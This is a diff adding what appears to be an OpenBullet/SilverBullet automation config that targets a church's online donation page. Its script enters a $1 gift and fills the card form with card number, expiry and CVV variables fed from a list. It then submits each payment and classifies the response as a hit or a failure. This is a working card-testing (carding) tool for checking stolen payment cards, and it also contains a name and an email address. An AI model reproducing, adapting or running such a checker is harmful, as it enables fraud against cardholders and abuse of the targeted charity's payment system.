@@ -1,0 +1,150 @@
+[SETTINGS]
+{
+  "Name": "1$",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2023-12-23T19:56:35.7755704+02:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "🔥 @X_LOL_CRK 🔥",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "1$",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+BROWSERACTION Open 
+
+BROWSERACTION ClearCookies 
+
+BROWSERACTION Maximize 
+
+NAVIGATE "https://events.rhema.org/give/one-time-gift/?" 
+
+#DELAY FUNCTION Delay "7000" 
+
+#SW ELEMENTACTION XPath "//*[@id=\"post-13468\"]/div/figure/iframe" 
+  SwitchToFrame 
+
+#Amount ELEMENTACTION XPath "//*[@id=\"RBC Tithes/Offerings\"]/div[2]/app-currency-input/input" 
+  SendKeys "1" 
+
+#Next ELEMENTACTION XPath "//*[@id=\"btn-save\"]" 
+  Click 
+
+#DELAY FUNCTION Delay "2000" 
+
+#GST ELEMENTACTION XPath "//*[@id=\"ngb-nav-2\"]" 
+  Click 
+
+#DELAY FUNCTION Delay "500" 
+
+#Email ELEMENTACTION XPath "//*[@id=\"email\"]" 
+  SendKeys "saidhesham.tst@gmail.com" 
+
+#F ELEMENTACTION XPath "//*[@id=\"firstName\"]" 
+  SendKeys "Said" 
+
+#L ELEMENTACTION XPath "//*[@id=\"lastName\"]" 
+  SendKeys "Said" 
+
+#Next ELEMENTACTION XPath "//*[@id=\"btn-submit\"]" 
+  Click 
+
+#DELAY FUNCTION Delay "3000" 
+
+#CARD ELEMENTACTION XPath "//*[@id=\"card-number\"]" 
+  SendKeys "<CNUBR>" 
+
+#YY FUNCTION Translate 
+  KEY "20" VALUE "" 
+  "<YEAR>" -> VAR "YY" 
+
+#EXP ELEMENTACTION XPath "//*[@id=\"exp-date\"]" 
+  SendKeys "<MONTH>/<YY>" 
+
+#CVC ELEMENTACTION XPath "//*[@id=\"cvc\"]" 
+  SendKeys "<CVV>" 
+
+#Holder ELEMENTACTION XPath "//*[@id=\"name\"]" 
+  SendKeys "Said Hesham" 
+
+#ZIP ELEMENTACTION XPath "//*[@id=\"zip\"]" 
+  SendKeys "90017" 
+
+#DELAY FUNCTION Delay "500" 
+
+#SAVE ELEMENTACTION XPath "//*[@id=\"btn-save-new-cc\"]" 
+  Click 
+
+#DELAY FUNCTION Delay "4500" 
+
+BROWSERACTION FullScreen 
+
+#PAY ELEMENTACTION XPath "/html/body/app-root/app-transaction-layout/div/div/app-route-slider-wrapper/div/app-review/div/div/div/app-nav-button/button/div" 
+  Click 
+
+#DELAY FUNCTION Delay "9000" 
+
+BROWSERACTION DOMtoSOURCE 
+
+BROWSERACTION Quit 
+
+#ERR_MSG PARSE "<SOURCE>" LR "class=\"d-flex flex-column\"> " "</div>" CreateEmpty=FALSE -> CAP "ERR MSG" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Your donation was processed successfully." 
+    KEY ">Thanks!<" 
+  KEYCHAIN Custom "BAD" OR 
+    KEY "We were unable to process this transaction" 
+
